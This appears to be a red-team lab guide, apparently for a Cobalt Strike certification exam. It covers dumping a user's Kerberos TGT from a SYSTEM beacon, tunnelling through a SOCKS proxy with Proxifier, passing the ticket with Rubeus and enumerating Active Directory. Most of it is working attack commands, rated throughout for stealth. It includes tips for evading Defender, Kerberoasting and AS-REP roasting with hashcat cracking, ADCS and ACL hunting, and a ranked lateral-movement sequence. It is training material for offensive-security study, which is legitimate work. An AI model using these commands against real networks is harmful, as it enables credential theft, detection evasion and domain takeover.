# SOCKS Pivoting Lab

> **Objective:** Obtain an LDAP service ticket and use it to impersonate a user over a SOCKS proxy for domain enumeration — without touching LSASS or spawning suspicious child processes.

**Lab flow summary:**
```
SYSTEM Beacon → krb_dump rsteel TGT → socks proxy on beacon
→ Attacker Desktop: DNS hosts → Proxifier → runas /netonly
→ Rubeus asktgs LDAP ticket → PTT → RSAT enumeration through proxy
```

---

## Phase 1 — Dump TGT

> **Why:** You need rsteel's TGT (Ticket Granting Ticket) to request downstream service tickets (LDAP, CIFS, etc.) without knowing the plaintext password. The TGT is cached in LSASS memory on the machine rsteel is logged into. We extract it via the Kerbeus BOF — which calls the Kerberos API directly rather than reading raw LSASS memory.

### Prerequisites

Load Kerbeus-BOF into your CS client before the lab begins (one-time per session):

```
Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
```

> **Why:** `krb_triage` and `krb_dump` are BOF commands added by Kerbeus-BOF. Without loading the CNA the beacon will reject them. The BOF runs entirely inside the beacon thread — no sacrificial process, no fork-and-run, no child process.

---

### Step 1 — Interact with the SYSTEM Beacon

In the Cobalt Strike UI, click the SYSTEM-integrity beacon on the target workstation. Confirm you are SYSTEM before dumping:

```cs
beacon> getuid
```

`OPSEC-🟢SAFE` — built-in, runs in beacon thread, no child process, no event log.

> **Why SYSTEM matters:** LSASS-backed Kerberos ticket cache is accessible from SYSTEM context. A medium-integrity beacon can call `krb_triage` only for its own session tickets. SYSTEM context gives access to all sessions on the box, including rsteel's interactive logon session.

---

### Step 2 — List Cached Tickets (triage)

```cs
beacon> krb_triage
```

`OPSEC-🟢SAFE` — BOF, Kerberos API call inside beacon thread. No process spawn, no LSASS memory read, no Event 4624/4648. Invisible to most EDR process-tree heuristics.

> **What to look for in output:**
> - Find the entry where `User:` is `rsteel` and `Service:` is `krbtgt` — that is the TGT.
> - Note the session LUID (e.g., `0x3e7`) shown next to the ticket entry — needed if you want to target a specific logon session.
> - Tickets with `Service: krbtgt` are TGTs. Tickets with `Service: ldap`, `cifs`, etc. are service tickets already cached.
> - Check the expiry — a TGT is typically valid 10h. If expired, rsteel must re-authenticate to get a fresh one.

---

### Step 3 — Dump rsteel's TGT

```cs
beacon> krb_dump /user:rsteel /service:krbtgt
```

`OPSEC-🟢SAFE` — BOF, Kerberos API (`LsaCallAuthenticationPackage` → `KerbRetrieveEncodedTicketMessage`). Does NOT open a handle to LSASS process memory (avoids Event 10 / Sysmon LSASS access telemetry). Output is a base64-encoded `.kirbi` blob printed to the beacon console.

> **Why not `mimikatz sekurlsa::tickets`?**  
> `mimikatz` run directly in the beacon is `OPSEC-🔴UNSAFE` — it is one of the most-signatured payloads on the platform. Even `execute-assembly Rubeus.exe dump` is `OPSEC-🟠CAUTION` (spawns a sacrificial process via fork-and-run). `krb_dump` is the exam-day preferred method.

> **Alternative if krb_dump is unavailable** (e.g., BOF fails on this target OS):
> ```cs
> beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /user:rsteel /service:krbtgt /nowrap
> ```
> `OPSEC-🟠CAUTION` — `execute-assembly` uses fork-and-run: spawns the process configured in `post-ex { spawnto_x64 }` (must NOT be the default `rundll32.exe`), injects the assembly, retrieves output via named pipe, then kills the process. Defender may still flag Rubeus.exe assembly content — test against current sig version.

---

### Step 4 — Save the Encoded Ticket

Copy the entire base64 blob from the beacon console output. Open Notepad or VSCode on the Attacker Desktop and paste it. You will reference it as `[ENCODED TGT]` in the next phase.

> **Tip:** The base64 blob is a single line. If it word-wraps in the console, select-all from the beacon output pane and paste into a text editor first to de-wrap it. Rubeus `asktgs` will reject a ticket with embedded newlines.

---

## Phase 2 — SOCKS Proxy

> **Why:** The SOCKS proxy tunnels TCP traffic from the Attacker Desktop through the beacon's C2 channel to the internal network. This lets tools on the Attacker Desktop (Rubeus, RSAT cmdlets, BloodHound) reach DCs and other internal hosts as if they were directly on the network — without needing a separate VPN or additional implant.

### Start the SOCKS Proxy

```cs
beacon> socks 1080 socks5
```

`OPSEC-🟢SAFE` — runs inside the beacon's existing C2 channel. No new network connection or listening port is opened on the **target**. The listening port `1080` is on the **team server** (Kali), not on the compromised host. No child process, no disk write.

> **Which beacon to use:** SOCKS does not require local admin or SYSTEM. The medium-integrity beacon is fine. Using the medium-integrity beacon is preferred — it keeps the SYSTEM beacon free for privilege-sensitive operations and reduces SYSTEM beacon exposure time.

> **Port note:** `1080` is the default SOCKS port. Any unused port on the team server works. If you run multiple proxy pivots (e.g., into a second forest), use different ports (`1081`, `1082`).

The Cobalt Strike client is no longer needed after this step — minimise it.

---

## Phase 3 — DNS Resolution (Attacker Desktop)

> **Why:** Internal hostnames like `lon-dc-1` and `contoso.com` do not resolve from the Attacker Desktop's default DNS — it is outside the domain. Without static host entries, Rubeus and RSAT cmdlets cannot resolve the DC by name, and Kerberos will fail (Kerberos is name-sensitive; IP-only does not work for ticket validation).

### Add Static Hosts Entries

Open Terminal **as Administrator** on the Attacker Desktop (required to write to `drivers\etc\hosts`):

```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```

> **Verify resolution before proceeding:**
> ```powershell
> Resolve-DnsName lon-dc-1
> ```
> Expected: returns `10.10.120.1`. If it fails, check that Terminal was run as admin and that no existing conflicting entry exists in the hosts file.

> **Cleanup (post-lab):** Remove the line from hosts when done. Leaving stale entries may cause resolution issues in future labs if IPs change.

---

## Phase 4 — Proxifier

> **Why:** Windows tools (Rubeus.exe, RSAT cmdlets like `Get-ADUser`) use the Windows networking stack and are not proxy-aware by default — they ignore environment variables like `http_proxy`. Proxifier intercepts all TCP connections from specified applications at the socket level and reroutes them through the SOCKS5 proxy on the team server. This is transparent to the applications.

### Launch Proxifier

From the Windows Start menu, launch **Proxifier**. It opens minimised in the system tray — click the tray icon to open the full window.

---

### Configure the Proxy Server

**Profile → Proxy Servers → Add**

| Field    | Value              |
|----------|--------------------|
| Address  | `10.0.0.5`         |
| Port     | `1080`             |
| Protocol | SOCKS Version 5    |

Click **OK**.

> A dialog asks "Use this proxy by default?" — click **No**. You want granular control via rules, not all traffic proxied (that would break internet connectivity on the Attacker Desktop).

Click **OK** again.

> A second dialog asks to edit Proxification Rules — click **Yes**.

---

### Configure Proxification Rules

**Add** a new rule:

| Field        | Value                        |
|--------------|------------------------------|
| Name         | `Beacon`                     |
| Target hosts | `10.10.120.0/23`             |
| Target ports | `Any`                        |
| Action       | Proxy SOCKS5 10.0.0.5        |

Click **OK** → **OK**.

> **Why `/23`?** The CONTOSO lab environment spans `10.10.120.0/23` (covers `.120.x` and `.121.x` subnets). Adjust the CIDR to match the actual target range shown in your lab environment. Routing only the target subnet prevents all Attacker Desktop traffic from going through the beacon.

> **Rule ordering matters:** Proxifier evaluates rules top-to-bottom. The default `Direct` rule must be below your `Beacon` rule, or it will short-circuit and traffic will go direct (failing to reach internal hosts).

---

## Phase 5 — LDAP Service Ticket

> **Why two steps (runas + asktgs)?** Kerberos tickets are session-bound. To use rsteel's TGT, you need a logon session on the Attacker Desktop that is configured for the CONTOSO domain context. `runas /netonly` creates a new process with a Type 9 network logon session (credentials used only for network auth, not local). The password is irrelevant — you will immediately overwrite the Kerberos state by injecting the real TGT via `asktgs /ptt`.

### Step 1 — Create a CONTOSO Network Logon Session

In an existing Terminal window (does not need to be admin), run:

```powershell
runas /netonly /user:CONTOSO\rsteel powershell.exe
```

When prompted for password, enter any string (e.g., `FakePass`). The password is not validated against the domain for `/netonly` sessions — the credential is stored for later network authentication challenges, but we will override it with a Kerberos ticket before making any network calls.

> A new PowerShell window opens running as `CONTOSO\rsteel` network context. All subsequent Rubeus and RSAT commands run in **this new window**.

---

### Step 2 — Request LDAP Service Ticket and Inject (PTT)

In the **new PowerShell window** (the runas one):

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
```

Replace `[ENCODED TGT]` with the full base64 blob saved in Phase 1.

> **What this does step-by-step:**
> 1. Rubeus sends a `TGS-REQ` to `lon-dc-1` (through the SOCKS proxy via Proxifier) using rsteel's TGT.
> 2. The DC validates the TGT, issues an LDAP service ticket (`TGS-REP`) for `ldap/lon-dc-1` encrypted with rsteel's session key.
> 3. `/ptt` (Pass-the-Ticket) injects the resulting service ticket into the current logon session's Kerberos cache — no kirbi file written to disk.
>
> **OPSEC note (attacker desktop):** Rubeus runs locally on the Attacker Desktop (your own controlled machine), not on a target. 
> Defender on the Attacker Desktop may flag `Rubeus.exe` by name or by assembly signature. If Defender is active on the dev box:
> - Rename `Rubeus.exe` to a neutral name (e.g., `svc_helper.exe`)
> - Or add a Defender exclusion for `C:\Tools\` (already done in CRTO lab environment)
> - In a real engagement, compile a custom Rubeus build with modified class/namespace names
>
> **Why not request the ticket from inside the beacon?**
> Requesting the TGS from inside the beacon would place the ticket in the beacon's session on the **target** host. We need the ticket in a session on the **Attacker Desktop** so that RSAT cmdlets running locally can use it through the proxy. The `asktgs` approach places the ticket exactly where we need it.

---

### Step 3 — Verify Ticket Injection

`klist` (native Windows command) will not show tickets in a `/netonly` session. Use Rubeus instead:

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```

> **Expected output:** Entry for `ldap/lon-dc-1 @ CONTOSO.COM` with a valid expiry time. If the ticket is missing, recheck:
> - The base64 blob has no embedded newlines
> - The `/dc:` flag points to a hostname that resolves (check Step 3 of Phase 3)
> - Proxifier rule covers `10.10.120.0/23` and the DC IP is in that range

---

## Phase 6 — Domain Enumeration via SOCKS

> **Why RSAT cmdlets instead of SharpHound/BloodHound here?** This lab demonstrates that with a valid Kerberos ticket and a SOCKS proxy you can use **native, signed Microsoft binaries** (no tooling on disk in the target network) to enumerate AD. This is the stealthiest enumeration path — RSAT cmdlets generate standard LDAP queries indistinguishable from a legitimate admin's workstation.

Run the following in the **runas PowerShell window** (where the LDAP ticket is cached):

```powershell
# Enumerate all computer objects
Get-ADComputer -Filter * -Server lon-dc-1

# Enumerate all user objects
Get-ADUser -Filter * -Server lon-dc-1

# Enumerate all OUs
Get-ADOrganizationalUnit -Filter * -Server lon-dc-1
```

`OPSEC-🟢SAFE` (from target network perspective) — LDAP queries arrive at the DC from the beacon's host IP (tunnelled through the SOCKS proxy). The DC sees standard LDAP bind + query operations from what it believes is rsteel's workstation. No PowerShell.exe on a **target** host, no child process, no Sysmon events on targets.

> **Expand the enumeration for exam-day:**
> ```powershell
> # SPNs (Kerberoast targets)
> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server lon-dc-1
>
> # Groups
> Get-ADGroup -Filter * -Server lon-dc-1
> Get-ADGroupMember "Domain Admins" -Server lon-dc-1 -Recursive
>
> # Trust relationships
> Get-ADTrust -Filter * -Server lon-dc-1
>
> # GPOs
> Get-GPO -All -Server lon-dc-1   # requires GroupPolicy module, pre-loaded in lab
> ```

---

## Lab Recap — OPSEC Summary

| Step | Command / Action | OPSEC Rating | Why |
|------|-----------------|--------------|-----|
| Triage Kerberos tickets | `krb_triage` | `🟢SAFE` | BOF, Kerberos API, no LSASS read, no child process |
| Dump TGT | `krb_dump /user:rsteel /service:krbtgt` | `🟢SAFE` | BOF, Kerberos API, no LSASS handle |
| Start SOCKS proxy | `socks 1080 socks5` | `🟢SAFE` | In-channel tunnel, listener on team server not target |
| Add DNS hosts | `Add-Content ... hosts` | `🟢SAFE` (attacker desktop only) | Local file write on your own machine |
| Request LDAP ST + PTT | `Rubeus.exe asktgs /ptt` | `🟠CAUTION` (attacker desktop) | Rubeus signatured by Defender — runs locally not on target |
| AD enumeration | `Get-ADComputer/User/OU` | `🟢SAFE` | Native signed binaries, standard LDAP queries |

### What NOT to do in this lab (exam OPSEC-🔴UNSAFE traps)

| Trap | Why it costs points |
|------|---------------------|
| `mimikatz sekurlsa::tickets` instead of `krb_dump` | Runs Mimikatz in beacon — OPSEC-🔴UNSAFE, well-signatured |
| `execute-assembly Rubeus.exe dump` without spawnto override | Fork-and-run from default `rundll32.exe` — signatured, spawns visible child |
| `shell klist` to verify tickets | Spawns `cmd.exe` as beacon child — OPSEC-🔴UNSAFE |
| Proxying ALL traffic through Proxifier (default rule) | Breaks attacker desktop internet; also noisy to security monitoring on a real engagement |
| Requesting TGS for `ldap/*` for all DCs at once | Generates burst of TGS-REQ in DC event logs — request only what you need |

---

> **Lab complete.** You have demonstrated: BOF-based ticket extraction → SOCKS tunnel → Proxifier routing → Kerberos PTT → native LDAP enumeration. No raw LSASS read, no child processes on targets, no tooling dropped to disk on the target network.

---

## Troubleshooting — SOCKS Proxy Dead

> **Symptom:** Proxifier logs show `error: Could not connect through proxy 10.0.0.5:1080 - Reading proxy reply on a connection request timed out`. Previously working connections start failing mid-session.

**Root cause:** The SOCKS listener runs inside the beacon thread. If the beacon stops calling home (dead, sleeping, or network disruption), the tunnel stalls and all proxy connections time out. The Proxifier side appears healthy — the failure is on the team server end.

### Step 1 — Diagnose: Beacon alive or dead?

Check the CS UI — look at the beacon's last callback timestamp.

- **Last callback recent (within sleep+jitter window)** → beacon alive, socks process dropped → restart it
- **Last callback stale / beacon greyed out** → beacon dead → re-establish

### Step 2a — Beacon alive: Restart the SOCKS listener

```cs
beacon> socks stop
beacon> socks 1080 socks5
```

Then re-test in Proxifier by re-running any RSAT command. Connection should succeed immediately.

### Step 2b — Beacon dead: Re-establish via persistence

```cs
// Option 1 — COM hijack (Teams DLL) — triggers when Teams next starts on the target
// Option 2 — WMI subscription — trigger manually via gpupdate from another session
// Option 3 — Re-run initial access vector (ngentask/AppDomainHijack) if no persistence deployed
```

If the beacon was the only foothold and no persistence was pre-deployed, you must re-run the initial compromise vector before the SOCKS proxy can be restored.

### Prevention — Lower sleep before SOCKS-heavy work

Heavy LDAP queries (BloodHound, mass RSAT enumeration) can stall a sleeping beacon because the proxy blocks waiting for beacon callback. Drop sleep to interactive before starting:

```cs
beacon> sleep 0          // interactive — constant callback, no sleep delay
// ... run your SOCKS-dependent enumeration ...
beacon> sleep 3000 20    // restore: 3s sleep, 20% jitter
```

> `OPSEC-🟠CAUTION` — `sleep 0` beacons continuously and is significantly noisier. Use only for the duration of the proxy task window, then restore immediately.

### Proxifier timeout log — what it looks like

```
[timestamp] powershell.exe - 10.10.120.1:9389 open through proxy 10.0.0.5:1080 SOCKS5    ← working
[timestamp] powershell.exe - 10.10.120.1:9389 close, X bytes sent, Y bytes received       ← closed cleanly
[timestamp] powershell.exe - 10.10.120.1:9389 error: Could not connect through proxy      ← beacon dead/sleeping
```

Port `9389` is the AD Web Services port used by RSAT cmdlets (ADWS — alternative to port 389 LDAP). Timeouts on this port mean RSAT cmdlets are failing silently or hanging.

---

## Post-Lab — Next Steps on Exam Day

> Once the SOCKS proxy is established and initial LDAP enumeration is complete, the following is the standard attack progression. Work top-to-bottom — each step informs the next.

### 1. Dump live user TGTs from the foothold `OPSEC-🟢SAFE`

`krb_triage` will show every user currently logged into the compromised host. Any live TGT is a free lateral movement ticket — dump them before moving on.

```cs
beacon> krb_triage                               // identify all live sessions
beacon> krb_dump /user:pchilds /service:krbtgt   // example: second user logged in
beacon> krb_dump /user:<anyuser> /service:krbtgt
```

Save every TGT blob. They expire in 10h — prioritise using them before rotating to other techniques.

### 2. Enumerate group memberships `OPSEC-🟢SAFE`

```powershell
# In runas PowerShell window (LDAP ticket in session)
Get-ADGroupMember "Domain Admins" -Server lon-dc-1 -Recursive
Get-ADGroupMember "Enterprise Admins" -Server lon-dc-1 -Recursive
Get-ADGroupMember "Remote Management Users" -Server lon-dc-1
Get-ADGroupMember "Remote Desktop Users" -Server lon-dc-1

# Check specific users found in enumeration
Get-ADPrincipalGroupMembership <username> -Server lon-dc-1
```

If any live TGT user (from step 1) is in a privileged group → immediate DA path via that ticket.

### 3. Confirm SPNs before Kerberoasting `OPSEC-🟢SAFE`

Never roast blind — enumerate SPNs first to avoid honeypot accounts and identify real targets.

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet -Server lon-dc-1 | Select SamAccountName,ServicePrincipalName,PasswordLastSet
```

> If `oracle_svc` or `mssql_svc` return **no SPN** (Rubeus reports "No results returned by LDAP"), the accounts are not Kerberoastable via standard method. Pivot to AS-REP roasting check immediately.

### 4. Kerberoast targeted SPNs `OPSEC-🟠CAUTION`

Roast only confirmed targets — one account at a time:

```cs
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:oracle_svc /nowrap
```

Send hashes to Kali for offline cracking:

```bash
hashcat -a 0 -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### 5. AS-REP Roasting check `OPSEC-🟠CAUTION`

Run if Kerberoasting yields no SPNs, or as a parallel check:

```powershell
# Check flag directly via RSAT
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth -Server lon-dc-1
```

If any hit:

```cs
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:<account> /format:hashcat /nowrap
```

```bash
hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### 6. ADCS check — investigate Certificate Services hosts `OPSEC-🟢SAFE`

Any host named `*-CS-*` or `*-CA-*` in the computer list is a high-priority ADCS target. Confirm via LDAP:

```powershell
Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} -SearchBase "CN=Configuration,DC=contoso,DC=com" -Properties * -Server lon-dc-1 | Select Name,dNSHostName

# List templates — look for ESC1 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) flag
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=com" -Filter * -Properties msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,Name -Server lon-dc-1 | Select Name,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag
```

If ADCS confirmed → Certify.exe to find ESC1–ESC8 vulnerabilities is the next module path.

### 7. ACL enumeration — find delegation paths `OPSEC-🟠CAUTION`

```cs
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "rsteel|pchilds|dyork"} | Select ObjectDN,ActiveDirectoryRights,IdentityReferenceName
```

Looking for: `WriteDACL`, `GenericWrite`, `GenericAll`, `ForceChangePassword`, `WriteOwner` on any user/computer/OU — these are direct DA paths without needing to crack a hash.

### 8. Lateral movement — priority order

Once you have credentials or a usable ticket:

```cs
// Always impersonate first
beacon> steal_token <pid>                           // OPSEC-🟢SAFE — preferred
beacon> kerberos_ticket_use <path-to.kirbi>         // inject a dumped TGT

// Then move — in OPSEC preference order
beacon> jump winrm64 <target> smb                   // OPSEC-🟢SAFE — first choice
beacon> jump scshell64 <target> smb                 // OPSEC-🟠CAUTION — no Event 7045
beacon> remote-exec wmi <target> <payload-path>     // OPSEC-🟠CAUTION — no service
beacon> jump psexec64 <target> smb                  // OPSEC-🔴UNSAFE — last resort only

beacon> rev2self                                    // drop token after move succeeds
```

### Priority stack summary

```
1. krb_dump all live users on foothold (free tickets, time-limited)
2. Group membership sweep → identify DA/EA members
3. SPN enumeration → targeted Kerberoast → offline crack
4. AS-REP roast check (parallel to step 3)
5. ADCS host check → Certify ESC scan
6. ACL sweep → GenericWrite/WriteDACL paths
7. Lateral move with best available credential/ticket
```
